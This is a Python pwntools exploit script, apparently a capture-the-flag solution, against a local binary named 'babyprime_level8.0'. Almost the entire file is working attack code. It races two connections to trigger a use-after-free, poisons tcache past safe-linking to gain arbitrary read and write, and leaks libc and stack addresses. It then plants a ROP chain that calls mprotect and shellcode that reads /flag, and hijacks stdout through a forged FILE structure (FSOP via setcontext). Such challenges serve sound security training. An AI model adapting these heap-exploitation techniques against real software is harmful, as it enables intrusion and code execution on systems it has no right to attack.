import time 
from pwn import *
import os

idx = 1

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	r1.clean()
	r2.clean()
	
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #

		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break

	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	#if debug:
	#	gdb.attach(p, s)
	#	print(f"{idx}")
	#	r1.interactive()
	r1.sendline(f"free 0".encode())
	r1.clean()
	idx += 1

def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	
	r1.sendline(f"printf {idx - 1}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	if debug:
		gdb.attach(p, s)
		pause()
		r1.sendline(f"scanf {idx - 1}".encode())
		r1.sendline(content)
		r1.interactive()
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
#	r1.interactive()
	
	
	
def exploit(r1, r2, p):
	s = '''
	set $mybase = (unsigned long)&challenge - 0x1a64
	b * $mybase + 0x1c43
	b * $mybase + 0x020eb
	b * $mybase + 0x02158
	b * $mybase + 0x01e68
	b * setcontext
	b * _IO_wfile_overflow
	b * _IO_2_1_stdout_

	
	'''
	
	leak = leak_tcache(r1, r2)
	
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		# pivoting around memory, so we need to leak many times
		
		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
				
		print("libc leak leak: ", hex(libc_leak))
		
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak, 0, p, s) # pivot 
		
		location3 = leak3 - 0x100
		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, p, s)
		print("stack_leak: ", hex(stack_leak))
	
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		binsh_addr = libc_base + 0x1d8698
		setuid = libc_base + 0xec0d0
		system = libc_base + 0x50d70
		pop_rdi = libc_base + 0x000000000002a3e5
		pop_rsi = libc_base + 0x000000000002be51
		pop_rdx = libc_base + 0x00000000000796a2
		execve = libc_base + 0xeb080
		
		libc = p.elf.libc
		
		context.arch = 'amd64'
		
		print("!!!!! MPROTECT + SHELLCODE !!!!!!")
		
		shellcode = asm('''
		    /* Open the file */
		    push 257
		    pop rax
		    mov rdi, -100       /* dirfd: AT_FDCWD */
		    lea rsi, [rip+flag] /* pointer to "CDr46w9anrq3vg0Z" */
		    xor edx, edx        /* flags: O_RDONLY */
		    syscall

		    /* Read and write in one step */
		    push rax
		    pop rdi
		    xor eax, eax        /* syscall: read */
		    sub rsp, 64         /* smaller buffer */
		    mov rsi, rsp        /* buffer address */
		    mov rdx, 64         /* buffer size */
		    syscall
		    
		    /* Write to stdout */
		    push rax
		    pop rdx
		    mov rax, 1          /* syscall: write */
		    mov rdi, 1          /* fd: stdout */
		    /* rsi already points to our buffer */
		    syscall

		flag:
		    .string "/flag" 

		''')
		
		mprotect_addr = libc_base + libc.symbols['mprotect']
		shellcode_addr = (leak << 12) + 0x1000
		shellcode_addr = rbp_addr + 0x7000 + 8 - 0x5e28 - 0x1000
		print("shellcode address: ", hex(shellcode_addr))
		
		# mprotect(shellcode_addr, 0x1000, 7)
		rop_chain = b""
		rop_chain += p64(pop_rdi)           
		rop_chain += p64(shellcode_addr)    
		rop_chain += p64(pop_rsi)            
		rop_chain += p64(0x1000)            
		rop_chain += p64(pop_rdx)           
		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
		rop_chain += p64(mprotect_addr)     

		payload = rop_chain + p64(shellcode_addr + len(rop_chain) + 8) + shellcode # jump to our shellcode
		
		print("Length of payload = ", hex(len(payload)))
		
		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"

		print(f"Checking bad chars (whitespaces)")
		if any(bad in shellcode for bad in badchars):
			print("WARNING: Shellcode contains bad characters!")
			print(f"Shellcode hex: {shellcode.hex()}")
			
		if any(bad in payload for bad in badchars):
			print("WARNING: ROP payload contains bad characters!")
			print(f"Payload hex: {payload.hex()}")
		
		# pre-write shellcode on an unimportant area on the stack
		
		
	
	

		
		setcontext = libc_base + 0x539e0
		important_pointer_1 = libc_base + 0x21ba70
#		important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xe30
		#important_pointer_1 = ( ( leak & ~0xff) << 12) + 0xf50
		
		contains_IO_wfile_overflow = libc_base + 0x2160d8
		_IO_wfile_overflow = libc_base + 0x86390
		_IO_2_1_stdout_ = libc_leak + 0xb00
		#_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0xd50
		#_IO_2_1_stdout_ = ( ( leak & ~0xff) << 12) + 0x870 # 0x0b here, badchars!
		
		#fsop_payload = b'\x00' * 0x300
		fsop_payload = b'\x00' * 0x78 # 0
		fsop_payload += p64(setcontext) # 0x78
		fsop_payload += p64(0) # 0x80
		fsop_payload += p64(important_pointer_1)  # 88
		fsop_payload += b'\x00' * 0x10  
		fsop_payload += p64(_IO_2_1_stdout_ + 0x10)  # _wide_data, offset 0xa0, 0x10 + 0x68 would be p64(setcontext)



		# setting up rsp

		fsop_payload += b'\x00' * 0x8
		fsop_payload += p64(shellcode_addr)# rsp would be set to this
		fsop_payload += p64(pop_rdi) # rcx would be set to this
		fsop_payload += b'\x00' * 0x8 
		fsop_payload += b'\x00' * 0x8
		fsop_payload += b'\x00' * 0x8


		fsop_payload += p64(contains_IO_wfile_overflow - 0x38) #0xd8
		fsop_payload += b'\x41' * 0x10
		fsop_payload += p64(_IO_2_1_stdout_+0x10) #0xd8 from fake file struct of _wide_data, which overlaps with the corrupted _IO_2_1_stdout_ file struct
		

		print("Length of fsop payload = ", hex(len(fsop_payload)))
		
			
		
		arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
		
		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 1, p, s)
		
		#gdb.attach(p, s)
		r1.interactive()	
		
		
		try:
			r1.clean()
			r2.clean()
			p.clean()
#			r2.sendline("quit")
			
			#r2.sendline("ls")
			r2.interactive()
			
			#p.interactive()
			response = p.recvall(timeout=2)
			print(response)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		#pause()
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level8.0'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
